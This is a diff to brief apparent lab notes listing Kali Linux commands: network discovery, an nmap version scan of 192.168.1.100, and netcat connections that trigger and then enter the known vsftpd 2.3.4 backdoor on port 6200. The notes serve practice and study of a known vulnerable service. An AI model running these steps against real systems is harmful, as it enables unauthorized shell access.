@@ -1,4 +1,7 @@
-sudo netdiscover          #Find the IPs on the network
+kali-CMD sudo netdiscover          #Find the IPs on the network
 
-nmap -sV 192.168.1.100    #View the ports being used and the version of each application
+kali-CMD nmap -sV 192.168.1.100    #View the ports being used and the version of each application
 
+kali-CMD nc 192.168.1.100 21       #Connects Kali system to port 21 (FTP) and on this vsftp 2.3.4 it opens a backdoor on port 6200
+
+kali-CMD2  nc 192.168.1.100 6200   #Connecting into the backdoor
